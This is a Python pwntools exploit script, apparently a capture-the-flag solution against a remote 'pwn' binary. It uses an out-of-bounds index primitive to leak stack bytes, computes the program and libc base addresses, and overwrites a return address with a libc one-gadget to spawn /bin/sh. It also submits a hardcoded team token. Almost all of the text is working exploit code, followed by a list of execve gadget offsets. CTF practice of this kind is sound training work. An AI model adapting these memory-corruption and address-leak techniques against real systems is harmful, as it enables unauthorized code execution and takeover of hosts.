# coding:utf-8

from pwn import *
import argparse

env = os.environ
env['LD_PRELOAD'] = './libc64.so'

# bdd3dd2bf77c76d516f9e715c96cb1fa.kr-lab.com 
IP = '1b190bf34e999d7f752a35fa9ee0d911.kr-lab.com'
PORT = '57856'
binary = './pwn'

io = None

parser = argparse.ArgumentParser()

parser.add_argument('-d', '--debugger', action='store_true')
parser.add_argument('-r', '--remote', action='store_true')
parser.add_argument('-l', '--local', action='store_true')
args = parser.parse_args()

sl = lambda x : io.sendline(x)
sd = lambda x : io.send(x)
sla = lambda x,y : io.sendlineafter(x,y)
rud = lambda x : io.recvuntil(x,drop=True)
ru = lambda x : io.recvuntil(x)

def lg(s, addr):
    print('\033[1;31;40m%30s-->0x%x\033[0m' % (s, addr))

if args.remote:
    io = remote(IP, PORT)  
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    elf = ELF(binary)
elif args.local or args.debugger:
    env = {"LD_PRELOAD": os.path.join(os.getcwd(), "libc.so.6")}
    #env = {}
    io = process(binary,  env=env)
    elf = ELF(binary)
    proc_base = io.libs()[os.path.abspath(os.path.join(os.getcwd(), binary))]
    libc_bb = io.libs()['/lib/x86_64-linux-gnu/libc.so.6']
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    parser.print_help()
    exit()

def debug(msg=""):
    pwnlib.gdb.attach(io,msg)
    raw_input()

def in_name(name):
    ru("name")
    sl(name)

def pro2(idx):
    ru("index")
    sl(str(idx))
    return rud("input").split(' ')

def pro3(value):
    ru("value")
    sl(str(value))

def leak(idx):
    # print 'enter leak'
    leak_addr = []
    
    for i in range(8):
        # print('idx -- '+ str(i))
        s = pro2(0x150 + idx - i - 1)
        # print s
        s = s[2][-3:-1]  # one byte
        if len(s) < 2:
            s = '0' + s  # fill
        leak_addr.append(s)
        # print(s)
        pro3(eval("0x" + str(s)))  # don't danage
    leak_addr = '0x' + ''.join(leak_addr) 
    return leak_addr

def leak_and_write(idx,bb):  ## bb like 7F1245 without 0x
    # print 'enter leak'
    leak_addr = []
    
    y = bytearray.fromhex(bb)
    z = list(y)
        
    for i in range(8):
        # print('idx -- '+ str(i))
        s = pro2(0x150 + idx - i - 1)
        # print s
        s = s[2][-3:-1]  # one byte
        if len(s) < 2:
            s = '0' + s  # fill
        leak_addr.append(s)
        # print(s)
        # print('hex -- ' + hex(z[i]))
        pro3(z[i])  # write_byte
    leak_addr = '0x' + ''.join(leak_addr) 
    return leak_addr


def exploit():
    in_name("chensem")



    # canary = []

    # io.interactive()


    # debug("""
    #     b *0x{:x}
    # """.format(proc_base+0xBBF))

    
    leak_addr = leak(16)
    print leak_addr

    pro_base = int(leak_addr,16) - 0xB11
    lg('pro_base',pro_base)
    # lg('load_base',proc_base)

    got_puts = pro_base + 0x202020

    ## leak libc
    leak_libc_start_main = leak(38 *8)
    print leak_libc_start_main
    libc_start_main = int(leak_libc_start_main,16) - 240
    lg('libc_start_main',libc_start_main)

    libc.address = libc_start_main - libc.symbols['__libc_start_main']
    lg('libc_base',libc.address)

    one_gg = libc.address + 0x45216

    write = hex(one_gg)
    write = write.replace('0x','')
    # write = write.rjust(8,'\x00')
    write = '0000' + write
    print('write ---' + write)
    # pause()

    leak_and_write(16,write)
    pro2(0)
    pro3(0)
 
   
    # debug("""
    #     b *0x{:x}
    # """.format(proc_base+0xBBF))
    for i in range(2):
        leak(0)

    sl("no")
    ru("token")
    io.sendline("icq9aed698872fd926b2c42f7d9c83a0")
    # lg('s',s)

    io.interactive()

if __name__ == "__main__":
    exploit()
"""
0x45216	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
"""
